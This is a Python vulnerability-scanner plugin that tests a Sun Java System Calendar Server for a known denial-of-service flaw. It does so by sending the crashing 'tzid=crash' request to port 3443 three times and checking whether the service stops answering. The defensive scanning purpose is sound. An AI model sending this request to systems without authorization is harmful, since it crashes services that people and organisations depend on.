#!/usr/bin/python
# -*- coding: utf-8 -*-
import time

from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http, ob):
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        result = []
        header = {
            "Host": domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "Cookie": ob.get('cookie') if ob.get('cookie') else '',
            # "Connection": "keep-alive"
        }
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        new_url = "https://%s:3443/?tzid=crash" % domain
        res_list = []
        for i in range(3):
            res, content = http.request(new_url, 'GET', headers=header)
            res_list.append(res.get('status'))
            time.sleep(2)
        if res_list[0] == '200' and res_list[1] != '200' and res_list[2] != '200':

            response = getResponse(res)
            request = getRequest(new_url, domain=ob['domain'])
            detail = "存在Sun Java System Calendar Server重复URI请求拒绝服务漏洞"
            result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
            return result
    except Exception, e:
        logger.error("File:SunJavaDDosScript_yd.py, run_domain function :%s" % (str(e)))
        return []
